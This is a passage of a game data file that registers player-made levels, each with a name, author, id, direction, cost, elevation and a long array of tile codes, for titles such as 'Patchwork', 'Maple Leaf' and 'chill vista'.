8,8,0,0,0,0,0,0,0,21,21,0,0,13,13,0,0,0,0,0,8,8,0,0,0,0,0,0,0,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,9,9,0,0,0,0,0,0,0,0,0,22,22,0,0,12,12,0,0,0,9,9,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,24,0,0,0,0,0,0,0,11,11,0,10,10,0,0,0,0,0,0,2,24,0,23,23,0,0,0,0,11,11,0,10,10,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Great Heathen Army",author="ZpLit",id="#1660609132",direction="right",cost=636,elevation=-2,map=[7,2,2,6,5,66,66,5,5,66,66,66,66,66,66,66,66,66,5,5,7,7,7,6,66,66,66,66,66,66,66,66,66,66,66,66,66,5,5,5,7,7,6,5,66,66,66,66,66,66,66,66,66,66,66,66,66,5,5,5,7,6,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,5,7,6,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,6,5,66,66,66,5,5,66,66,66,66,66,66,66,66,66,66,66,66,5,6,5,66,66,66,5,6,5,5,66,66,66,66,66,66,66,66,66,5,5,6,5,66,66,66,66,5,6,6,5,66,66,66,66,66,66,66,66,5,5,6,5,66,66,66,66,5,6,6,5,66,66,66,66,66,66,66,66,5,5,5,66,66,66,66,5,6,6,6,5,66,66,66,66,66,66,66,66,5,5,66,66,66,66,5,6,6,6,6,5,66,66,66,66,66,66,66,5,5,5,66,66,66,66,66,5,6,6,6,5,66,66,66,66,66,66,66,5,5,5,66,66,66,66,66,66,5,6,5,66,66,66,66,66,66,66,66,5,5,5,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,5,5,5,2,66,66,66,66,66,93,66,5,5,66,66,66,66,66,66,5,5,5,5,2,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,5,5,5,5,5,66,66,66,66,66,66,5,5,5,66,66,66,66,66,66,5,5,5,5,5,66,66,66,5,5,5,6,6,5,66,66,66,66,66,66,66,5,5,5,5,5,5,5,5,6,6,6,6,6,5,66,66,66,66,5,5,5,5,5,5,6,6,6,6,6,6,6,6,6,6,5,66,66,66,5,5,5,5,5,5]});
maps.push({name="Patchwork",author="Niikos",id="#1660620721",direction="left",cost=345,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,109,109,2,2,9,0,0,0,0,0,0,0,1,1,1,1,1,1,1,9,8,9,9,9,9,0,0,0,0,0,0,0,1,5,94,5,5,5,5,9,8,29,29,29,29,0,0,0,0,0,0,0,1,94,5,5,5,5,5,9,9,9,9,29,29,0,0,0,0,0,0,0,1,5,5,5,5,5,5,49,9,9,10,29,29,0,100,0,0,0,0,0,1,5,5,5,5,5,5,49,90,9,10,10,29,0,16,0,0,0,0,0,1,5,5,5,5,5,5,49,9,9,9,9,29,0,16,0,0,0,0,0,1,5,5,5,5,5,5,49,8,8,49,9,9,0,16,0,0,0,0,0,1,5,5,5,5,5,5,9,9,9,49,90,9,0,4,0,0,0,0,0,1,4,4,5,5,5,5,9,10,10,49,9,9,9,9,9,9,9,49,49,29,29,29,9,9,109,109,9,9,9,49,8,9,9,10,9,49,49,90,9,9,9,9,9,10,9,9,90,9,9,9,9,9,9,9,9,90,9,29,9,10,10,9,9,10,10,9,9,9,9,9,90,9,9,90,9,29,29,29,9,10,9,9,9,29,29,29,29,29,10,9,9,9,9,9,9,9,10,9,9,9,9,90,9,29,29,29,29,29,10,9,8,8,2,9,9,9,10,9,90,9,9,49,49,49,9,90,9,9,9,9,8,9,2,9,8,9,109,109,109,9,10,10,109,109,109,9,9,9,9,9,9,9,49,9,8,9,90,9,9,9,9,10,9,9,8,8,9,9,9,11,11,11,49,9,8,9,9,9,10,10,49,9,9,9,49,49,49,49,109,11,13,13,49,9,29,29,29,29,9,9,49,9,90,9,9,9,9,9,109,11,13,93]});
maps.push({name="Wet Socks",author="Niikos",id="#1660621995",direction="right",cost=668,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,14,65,65,65,65,65,65,65,1,65,65,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,1,65,65,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,1,65,65,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,1,65,65,65,1,65,65,65,65,1,1,1,1,1,1,1,1,65,65,65,1,65,65,65,1,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,1,65,65,65,1,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,1,65,65,65,1,65,65,65,14,2,1,65,65,65,65,65,65,65,65,65,1,65,65,65,1,65,65,65,14,2,1,65,65,65,65,65,65,65,65,65,1,65,65,65,1,1,1,1,1,1,1,65,65,65,1,1,1,1,1,1,1,65,65,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,1,65,65,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,1,65,65,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,1,65,65,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,1,65,65,65,65,65,65,65,65,1,1,1,1,1,1,1,1,65,65,65,1,1,1,1,1,1,1,65,65,1,1,94,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,93,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,94,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="FloorisLava",author="Niikos",id="#1660624566",direction="right",cost=808,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,2,2,14,1,1,1,75,97,75,75,75,75,75,75,75,75,75,75,75,14,14,14,14,75,1,1,75,24,75,75,75,75,75,75,75,75,75,75,75,14,14,14,14,75,1,1,75,24,75,75,75,75,75,75,75,75,75,75,14,14,14,14,14,75,1,1,75,3,75,75,75,75,75,75,75,75,75,14,14,14,14,14,14,75,1,1,75,14,14,14,14,14,14,75,14,14,14,14,14,14,14,14,14,75,1,1,75,14,14,14,14,14,14,75,14,14,14,14,14,14,14,75,75,75,1,1,75,14,14,14,14,14,14,75,14,14,14,14,14,14,14,75,75,75,1,1,75,14,14,14,75,75,75,75,75,75,75,75,75,75,75,75,75,75,1,1,75,14,14,14,75,75,75,75,75,75,75,75,75,75,75,75,75,75,1,1,96,96,96,96,96,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,75,14,14,14,75,75,75,75,75,75,75,75,75,75,93,75,75,93,75,1,75,14,14,14,75,75,75,75,75,75,75,75,75,75,14,75,75,14,75,1,75,14,14,14,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,1,75,14,14,14,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,1,75,14,14,14,75,14,14,14,75,14,14,14,14,75,14,14,14,14,2,1,75,14,14,14,75,14,14,14,75,14,14,14,14,75,14,14,14,14,2,1,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,1,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Maple Leaf",author="TF2 Pencil",id="#1660638523",direction="forward",cost=490,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,10,10,10,10,10,10,76,76,76,10,10,10,10,10,10,10,10,10,0,0,10,10,10,10,10,10,76,76,76,76,10,10,10,76,10,10,10,10,0,0,10,10,10,10,10,10,76,76,76,76,76,10,76,76,10,10,10,10,0,0,10,10,10,10,10,10,10,76,76,76,76,76,76,76,10,10,10,10,0,0,10,10,10,10,10,10,10,10,76,76,76,76,76,76,10,10,10,10,0,0,10,10,10,10,76,76,76,76,76,76,76,76,76,76,10,10,10,10,0,0,10,10,10,76,76,76,76,76,76,76,76,76,76,76,76,76,10,10,0,0,10,10,10,10,76,76,76,76,76,76,76,76,76,76,10,10,10,10,0,0,10,10,10,10,10,10,10,10,76,76,76,76,76,76,10,10,10,10,0,0,10,10,10,10,10,10,10,76,76,76,76,76,76,76,10,10,10,10,0,0,10,10,10,10,10,10,76,76,76,76,76,10,76,76,10,10,10,10,0,0,10,10,10,10,10,10,76,76,76,76,10,10,10,76,10,10,10,10,0,0,10,10,10,10,10,10,76,76,76,10,10,10,10,10,10,10,10,10,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Where do I go",author="TF2 Pencil",id="#1660638566",direction="forward",cost=230,elevation=0,map=[0,2,2,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,10,10,0,0,0,0,1,132,10,10,10,10,10,10,10,10,10,10,0,0,10,10,0,0,0,0,1,10,10,10,10,10,10,10,10,10,10,10,0,0,10,10,0,0,0,0,1,1,1,1,1,1,1,1,1,1,10,10,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,1,10,10,0,0,10,10,0,0,0,0,1,1,1,1,1,1,1,1,1,1,10,10,0,0,10,10,10,0,0,0,1,132,10,10,10,10,10,10,10,10,10,10,0,0,10,131,10,0,0,0,1,10,10,10,10,10,10,10,10,10,10,10,0,0,10,10,10,0,0,0,1,1,1,1,1,1,1,1,1,1,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,10,10,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,10,10,0,0,0,0,0,0,0,0,1,132,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,10,10,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,10,10,0,0,0,0,0,0,0,0,1,132,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="downhill run",author="fantasy",id="#1660666644",direction="right",cost=122,elevation=-11,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,77,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,77,24,77,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,0,77,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,0,77,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,77,24,77,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,77,24,77,0,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,0,0,77,0,0,0,0,0,0,0,0,0,36,36,0,0,0,0,77,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,0,0,0,77,24,77,0,0,0,0,0,28,28,2,0,0,0,0,35,35,0,0,0,0,77,0,0,0,0,0,0,28,28,2,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,0,0,28,28,0,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,0,0,29,29,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,29,29,0,0,0,0,0,34,34,33,33,33,32,32,32,31,31,31,30,30,30,29,0,0,0,0,0,34,34,33,33,33,32,32,32,31,31,31,30,30,30,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="go trigger the end",author="fantasy",id="#1660666772",direction="right",cost=125,elevation=-7,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,100,0,0,0,0,0,0,0,0,0,0,33,33,0,0,0,0,0,0,0,33,0,0,0,0,0,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,131,33,33,93,33,33,33,0,33,0,33,0,33,0,33,0,0,0,0,0,33,33,33,33,33,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,33,93,33,94,33,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,33,33,33,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,33,33,33,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,33,33,33,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,33,33,33,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,131,33,33,33,33,33,131,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,132,26,26,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,26,26,26,26,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,26,26,26,26,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,26,26,89,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,26,26,26,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,132,26,26,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="keep defending v2",author="fantasy",id="#1660666905",direction="forward",cost=77,elevation=9,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,26,26,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,27,27,27,27,27,27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,29,29,29,29,29,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,30,30,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,31,31,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,32,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,33,33,33,33,0,0,0,0,0,0,0,0,0,0,0,0,33,0,0,0,34,34,34,33,0,33,0,33,0,33,100,0,0,0,100,33,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="BabyBooster",author="Niikos",id="#1660666913",direction="left",cost=233,elevation=-10,map=[34,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,2,2,44,2,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,2,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,34,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,65,65,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,65,65,65,65,65,0,0,0,0,0,128,44,44,44,44,44,44,0,34,34,65,65,65,65,65,0,0,0,0,0,128,44,44,44,44,44,44,0,34,34,65,65,65,65,65,0,0,0,0,0,128,44,44,44,44,44,44,0,34,34,65,65,0,0,0,0,1,1,0,0,0,0,0,44,44,44,44,0,34,34,34,34,0,0,0,0,1,1,0,0,0,0,0,94,93,94,93]});
maps.push({name="BoostUpTheLevels",author="Niikos",id="#1660668007",direction="right",cost=192,elevation=10,map=[0,2,2,0,1,40,40,40,40,41,41,42,42,129,0,0,0,44,44,44,0,34,34,0,1,39,39,40,40,41,41,42,42,129,0,0,0,44,44,2,0,34,34,0,1,39,39,40,40,41,41,42,42,129,0,0,0,44,44,2,0,34,34,0,1,39,39,0,0,0,0,0,0,0,0,0,0,44,44,44,0,34,34,0,1,39,39,0,1,1,1,1,1,1,1,1,0,0,0,0,0,34,34,0,1,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,1,39,39,39,38,38,37,37,0,0,128,34,34,34,0,0,0,127,127,0,1,39,39,39,38,38,37,37,0,0,128,34,34,34,0,0,0,0,0,0,1,39,39,39,38,38,37,37,0,0,128,34,34,34,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,34,34,34,34,34,34,129,0,0,0,0,0,0,34,34,34,34,0,0,0,34,34,34,34,34,34,129,0,0,0,0,0,0,34,34,34,34,0,0,0,34,34,34,34,34,34,129,0,0,0,0,0,0,34,34,34,34,0,0]});
maps.push({name="TripleThreat",author="Niikos",id="#1660669265",direction="right",cost=401,elevation=5,map=[34,2,2,0,0,1,93,39,39,39,39,39,39,39,39,39,39,39,39,39,34,34,34,0,0,1,93,39,132,39,39,39,39,39,39,39,39,39,39,2,34,34,34,0,0,1,39,39,39,39,39,39,39,39,39,39,39,39,39,2,34,34,34,0,0,1,39,39,39,39,39,134,39,39,39,39,39,39,39,39,34,34,34,0,0,1,39,39,39,39,39,39,39,39,39,39,39,39,39,39,34,34,34,0,0,1,94,39,39,39,39,39,39,39,137,39,39,39,39,39,34,34,34,0,0,1,94,39,39,39,39,39,39,39,39,39,39,39,39,39,34,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,34,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,34,34,34,129,0,0,0,0,0,65,65,65,34,34,34,34,34,34,34,131,34,34,34,129,0,0,0,0,0,65,65,65,34,34,34,34,34,34,34,131,34,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,34,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,34,34,34,129,0,0,0,0,0,65,65,65,34,34,34,34,34,34,34,133,34,34,34,129,0,0,0,0,0,65,65,65,34,34,34,34,34,34,34,133,34,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,34,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,34,34,34,129,0,0,0,0,0,65,65,65,34,34,34,34,34,34,34,136,34,34,34,129,0,0,0,0,0,65,65,65,34,34,34,34,34,34,34,136,34,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="displaced escape",author="king buzzo",id="#1660672085",direction="forward",cost=296,elevation=19,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,1,1,0,0,0,0,0,10,10,10,10,10,10,0,0,0,6,6,1,1,1,9,0,0,0,11,11,10,76,76,76,76,10,0,0,0,5,6,1,8,8,9,0,0,0,10,10,10,10,10,10,76,10,92,0,0,3,7,7,7,8,90,7,8,9,10,10,10,76,76,10,76,10,24,0,0,3,7,7,90,7,8,7,8,10,10,11,10,76,76,10,76,10,24,0,0,0,0,0,7,8,9,0,0,0,10,10,10,10,10,10,76,10,24,0,0,0,0,0,0,0,9,0,0,0,11,11,10,76,76,76,76,10,24,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,24,0,0,0,0,0,1,0,1,0,1,0,1,0,1,0,1,0,1,3,24,0,0,0,38,38,38,1,0,1,0,1,0,1,0,1,0,1,0,1,95,0,38,38,38,65,38,0,62,22,22,22,22,24,23,23,24,24,24,24,24,0,38,24,24,23,23,62,62,22,65,65,65,23,24,22,22,24,24,24,24,0,92,24,24,24,1,1,1,22,65,24,24,24,23,23,24,24,23,24,24,0,38,24,24,23,23,62,62,22,65,24,24,23,22,23,24,23,24,23,24,0,92,24,24,0,0,0,62,22,22,22,22,22,23,24,24,24,24,24,24,0,38,24,24,0,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,0,0,91,91,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="chill vista",author="king buzzo",id="#1660673232",direction="forward",cost=269,elevation=18,map=[1,37,37,37,37,37,0,0,2,2,0,0,0,0,0,0,0,0,0,0,1,24,24,24,1,37,0,5,5,5,5,0,0,0,24,24,24,24,24,0,1,24,132,24,1,37,0,0,90,5,0,0,24,24,24,24,24,3,24,0,1,24,24,24,1,37,0,0,5,90,0,0,24,131,24,24,3,3,24,0,37,23,23,23,37,37,0,5,5,5,5,0,24,24,24,24,3,3,24,0,38,90,23,23,38,0,0,9,95,95,9,0,0,1,0,0,9,9,9,0,39,23,22,23,39,0,9,9,6,6,9,9,1,0,0,0,9,8,9,0,40,23,21,23,40,0,9,1,7,7,1,9,0,1,9,9,9,8,9,0,41,22,23,23,41,0,9,1,8,8,1,9,1,0,9,8,8,9,9,0,0,23,21,21,42,0,9,9,9,9,9,9,0,1,8,8,9,9,0,0,0,23,23,22,43,0,0,0,9,9,1,0,1,0,9,8,9,0,0,0,0,23,23,23,0,0,93,0,9,9,0,1,0,1,8,9,8,3,0,0,0,23,90,23,0,0,17,0,9,9,9,9,9,9,9,9,9,3,0,5,1,22,23,21,90,23,1,0,9,9,9,10,9,10,9,8,9,0,0,0,1,21,23,21,23,23,1,0,9,10,9,9,9,9,9,9,9,0,0,5,1,23,23,22,21,21,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,23,90,22,1,0,0,0,0,0,0,0,0,0,5,0,0,5,0,0,1,23,22,23,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,23,23,23,1,0,0,0,0,0,0,0,0,0,0,5,0,93,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5]});
maps.push({name="mountain escape",author="king buzzo",id="#1660674237",direction="forward",cost=183,elevation=9,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,5,5,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,9,93,1,0,8,7,7,8,0,1,94,9,0,0,0,0,0,0,0,0,9,1,0,0,0,8,8,0,0,0,1,9,0,0,0,0,0,0,0,0,0,9,1,0,9,8,8,9,0,1,9,0,0,0,0,0,0,0,0,0,0,0,0,10,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,13,13,13,13,10,10,0,0,0,0,0,0,0,0,0,0,0,11,10,13,13,100,13,13,13,10,11,0,0,0,0,0,0,0,0,0,12,11,13,13,13,85,13,13,13,13,12,12,0,0,0,0,0,0,0,0,12,13,13,13,13,13,13,13,13,13,13,12,0,0,0,0,0,0,0,0,13,13,12,13,13,13,13,13,13,13,13,33,0,0,0,0,0,0,0,0,13,12,13,13,13,12,14,24,13,13,13,33,0,0,0,0,0,0,0,0,14,13,13,13,24,14,24,14,13,13,13,33,0,0,0,0,0,0,0,0,13,12,13,13,14,13,12,14,24,14,13,33,0,0,0,0,0,0,0,0,13,13,13,14,14,13,12,14,13,14,24,85,33,0,0,0,0,0,0,0,0,24,12,14,13,12,13,14,14,24,24,3,33,0,0,0,0,0,0,0,0,0,13,14,14,14,14,14,24,24,24,3,33,0,0,0,0,0,0,0,0,0,0,14,14,14,65,65,14,0,33,33,33,0,0,0,0,0,0,0,0,0,0,2,2,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="ChaChaSlide",author="MoistNoodlez",id="#1660695249",direction="right",cost=167,elevation=0,map=[0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,14,97,14,0,14,14,14,0,0,0,0,0,0,0,1,0,0,1,0,0,14,0,14,0,0,14,0,0,0,0,0,0,0,0,1,14,14,1,0,0,14,0,14,0,14,14,14,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,1,0,14,1,0,0,0,0,0,14,0,14,0,0,0,0,0,0,0,0,1,0,14,1,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,1,0,14,1,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,1,14,0,1,0,0,0,0,0,14,14,14,14,96,2,0,0,0,0,0,1,14,0,1,0,0,0,0,0,14,0,0,14,96,2,1,1,1,1,1,1,14,0,1,0,0,0,0,0,14,0,0,14,96,96,1,14,135,135,135,135,135,135,1,0,0,0,0,0,0,0,0,0,0,0,1,14,1,1,1,1,1,1,1,14,0,14,0,14,0,0,14,14,14,0,1,14,135,135,135,135,135,135,14,14,14,0,14,0,0,0,0,14,0,0,1,1,1,1,1,1,1,1,1,14,0,14,0,14,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,97,14,0,0]});
maps.push({name="FireWater",author="MoistNoodlez",id="#1660695517",direction="forward",cost=382,elevation=0,map=[0,0,0,0,0,0,0,14,14,2,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,66,75,75,66,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,69,75,75,69,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,69,75,75,69,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,69,75,75,69,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,69,75,75,69,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,69,75,75,69,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,69,75,75,69,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,69,75,75,69,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,69,75,75,69,0,0,0,0,0,0,14,14,97,66,69,69,69,69,69,69,66,75,75,66,69,69,69,69,69,69,66,97,14,66,69,69,69,69,69,69,66,75,75,66,69,69,69,69,69,69,66,14,14,14,0,0,0,0,0,14,69,75,75,69,14,0,0,0,0,0,14,14,14,0,0,0,0,0,0,14,69,75,75,69,14,0,0,0,0,0,0,14,14,0,0,0,0,0,0,14,69,75,75,69,14,0,0,0,0,0,0,14,14,0,0,0,0,0,0,14,69,75,75,69,14,0,0,0,0,0,0,14,96,0,0,0,0,0,0,14,69,75,75,69,14,0,0,0,0,0,0,96,14,0,0,0,0,0,14,14,66,14,14,66,14,14,0,0,0,0,0,14,14,14,14,14,14,14,14,14,96,96,96,96,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,96,2,2,96,14,14,14,14,14,14,14,14]});
